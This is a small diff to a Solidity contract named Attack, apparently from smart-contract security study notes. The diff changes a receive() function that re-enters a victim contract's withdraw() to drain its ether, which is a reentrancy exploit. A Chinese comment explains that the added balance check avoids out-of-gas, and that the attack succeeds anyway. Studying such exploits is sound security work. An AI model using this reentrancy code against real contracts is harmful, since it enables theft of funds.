@@ -505,7 +505,7 @@ contract Attack {
     receive() external payable {
         if (address(victimContract).balance >= 0.001 ether) {
             victimContract.withdraw(0.001 ether);
-        } else {
+        } else if (address(victimContract).balance > 0 ether){ // 这里后面修改了一下，就不会出 out of gas 的问题，但 out of gas 也会攻击成功
             victimContract.withdraw(address(victimContract).balance);
         }
     }
